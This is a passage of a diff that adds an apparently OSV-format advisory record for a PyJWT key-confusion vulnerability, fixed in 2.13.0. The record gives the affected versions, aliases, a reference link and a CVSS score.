+            "0.1.4",
+            "0.1.5",
+            "0.1.6",
+            "0.1.7",
+            "0.1.8",
+            "0.1.9",
+            "0.2.0",
+            "0.2.1",
+            "0.2.3",
+            "0.3.0",
+            "0.3.1",
+            "0.3.2",
+            "0.4.0",
+            "0.4.1",
+            "0.4.2",
+            "0.4.3",
+            "1.0.0",
+            "1.0.1",
+            "1.1.0",
+            "1.3.0",
+            "1.4.0",
+            "1.4.1",
+            "1.4.2",
+            "1.5.0",
+            "1.5.1",
+            "1.5.2",
+            "1.5.3",
+            "1.6.0",
+            "1.6.1",
+            "1.6.3",
+            "1.6.4",
+            "1.7.0",
+            "1.7.1",
+            "2.0.0",
+            "2.0.0a1",
+            "2.0.0a2",
+            "2.0.1",
+            "2.1.0",
+            "2.10.0",
+            "2.10.1",
+            "2.11.0",
+            "2.12.0",
+            "2.12.1",
+            "2.2.0",
+            "2.3.0",
+            "2.4.0",
+            "2.5.0",
+            "2.6.0",
+            "2.7.0",
+            "2.8.0",
+            "2.9.0"
+          ]
+        }
+      ],
+      "aliases": [
+        "CVE-2026-48526",
+        "GHSA-xgmm-8j9v-c9wx"
+      ],
+      "details": "PyJWT is a JSON Web Token implementation in Python. Prior to 2.13.0, when the verifier is decoding JSON Web Tokens, while supporting both asymmetric and HMAC algorithms, the library does not validate use of JSON Web Keys in HMAC algorithm, allowing attacker to use the issuer public key as the secret key for HMAC algorithm. This vulnerability is fixed in 2.13.0.",
+      "id": "PYSEC-2026-179",
+      "modified": "2026-06-02T12:15:10.840770477Z",
+      "published": "2026-05-28T16:16:29.657Z",
+      "references": [
+        {
+          "type": "EVIDENCE",
+          "url": "https://github.com/jpadilla/pyjwt/security/advisories/GHSA-xgmm-8j9v-c9wx"
+        }
+      ],
+      "schema_version": "1.7.5",
+      "severity": [
+        {
+          "score": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:N",
+          "type": "CVSS_V3"
+        }
+      ]
+    }
+  ]
+}
